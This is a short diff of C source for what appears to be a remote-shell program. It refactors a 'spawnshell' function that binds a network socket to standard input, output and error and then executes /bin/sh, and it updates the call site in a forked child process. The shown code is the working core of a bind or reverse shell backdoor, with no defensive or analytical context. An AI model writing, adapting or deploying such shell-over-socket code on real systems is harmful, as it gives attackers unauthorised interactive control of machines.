@@ -9,11 +9,11 @@
 
 in_addr_t inet_addr(const char *cp);
 
-void spawnshell(int in, int out, int err)
+void spawnshell(int sock)
 {
-    dup2(in, 0);
-    dup2(out, 1);
-    dup2(err, 2);
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
     execve("/bin/sh", (char *[]){NULL}, (char *[]){NULL});
 }
 
@@ -48,7 +48,7 @@ int main(int argc, char *argv[])
             {
                 exit(3);
             }
-            spawnshell(sock, sock, sock);
+            spawnshell(sock);
             exit(0);
         }
         else
